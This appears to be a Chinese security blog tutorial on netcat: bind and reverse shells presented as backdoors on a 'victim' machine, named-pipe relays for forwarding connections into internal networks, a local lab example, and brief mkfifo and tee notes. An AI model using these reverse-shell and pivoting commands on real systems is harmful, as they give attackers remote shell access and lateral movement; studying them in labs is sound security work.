---
layout: single
author_profile: true
comments: true
title: nc高级用法
category: cybersecurity
tags: [Linux]
---

# nc实现后门
在[《reverse shell原理》](http://onestraw.net/linux/reverse-shell-principle)讲过用bash和python实现reverse shell的原理.  

### 1.正向

受害机：

	nc -l -p 3333 -e /bin/bash  

攻击机：

	nc targetip 3333  

有的版本不能同时使用-l和-p选项，这时只使用-p选项指定端口就可以建立监听。

### 2.反向

攻击机：

	nc -l -vv -p 3333   

受害机：

	nc -e /bin/bash targetip 3333  

# nc端口转发

### 1. listener-to-client模式

用于外网访问内网  

    $ mkfifo backpipe
    $ nc -l -p [localport] 0< backpipe | nc [target ip] [port] | tee backpipe

mkfifo命令是创建一个先进先出的管道文件，具体见后面。
nc命令分解一下，如下：

	nc -l -p [localport] 0< backpipe 

在本地localport端口监听TCP 连接，记为一个socket-1，socket-1从标准输入0读取数据并发送向TCP连接的另一端，socket-1从另一端收到的数据写到标准输出1，将backpipe文件内容重定向到标准输入0，通过管道将socket-1的收到的数据重定向到命令

	nc [target ip] [port]
	
作为其标准输入，这条命令也会建立一个连接，记为socket-2，socket-2将socket-1的输出作为输入发送出去，socket-2收到的数据通过管道重定向到下一条命令：

	tee backpipe

这条命令将socket-2收到的数据作为标准输入，写到标准输出1，这次是显示在终端了，同时写入到文件backpipe，这样socket-1又有数据要传送了。

### 2. listener-to-listener模式

用于一个内网机器和另一个内网机器通信  

	$ mkfifo backpipe
    $ nc -l -p [localport1] 0< backpipe | nc -l -p [localport2] | tee backpipe

### 3. client-to-client模式

	$ mkfifo backpipe
    $ nc [ip1] [port1] 0< backpipe | nc [ip2] [port2] | tee backpipe
	
	
# nc端口转发实例

ubuntu中打开三个终端模拟端口转发的3个，本地IP是192.168.232.128

### 1. 内网和外网

控制端：

	nc -l -p 3333

中转站：
	
	mkfifo hubpipe
	nc -l -p 2222 0<hubpipe|nc 192.168.232.128 3333|tee hubpipe
	
被控端：

	nc 192.168.232.128 2222 -e /bin/bash

### 2. 内网和内网

中转站：

	mkfifo hubpipe
	nc -l -p 2222 0<hubpipe|nc -l -p 3333|tee hubpipe
	
控制端：

	nc 192.168.232.128 3333

被控端：

	nc 192.168.232.128 2222 -e /bin/bash

# 注释

### 1. mkfifo

mkfifo命令用于创建一个FIFO（先进先出）方式的命名管道，具体用法如下

	Usage: mkfifo [OPTION]... NAME...
	Create named pipes (FIFOs) with the given NAMEs.
	Mandatory arguments to long options are mandatory for short options too.
	  -m, --mode=MODE    set file permission bits to MODE, not a=rw - umask
	  -Z, --context=CTX  set the SELinux security context of each NAME to CTX
		  --help     display this help and exit
		  --version  output version information and exit

### 2. tee

tee命令将标准输入的数据写入标准输出和tee命令指定的文件参数

	NAME
		   tee - read from standard input and write to standard output and files
	SYNOPSIS
		   tee [OPTION]... [FILE]...
	DESCRIPTION
		   Copy standard input to each FILE, and also to standard output.

### 3. 标准流

	stdin	0
	stdout	1
	stderr	2
